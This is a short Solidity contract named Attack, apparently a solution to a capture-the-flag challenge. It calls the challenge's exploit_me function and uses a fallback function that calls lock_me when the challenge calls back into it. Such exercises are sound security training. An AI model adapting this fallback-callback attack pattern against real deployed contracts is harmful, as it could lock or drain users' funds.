// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/access/Ownable.sol';
import './Challenge.sol';

contract Attack is Ownable {
    Challenge public challenge;

    constructor(address challenge_) {
        challenge = Challenge(challenge_);
    }

    fallback() external {
        challenge.lock_me();
    }

    function hack(address me_) external onlyOwner {
        challenge.exploit_me(me_);
    }
}
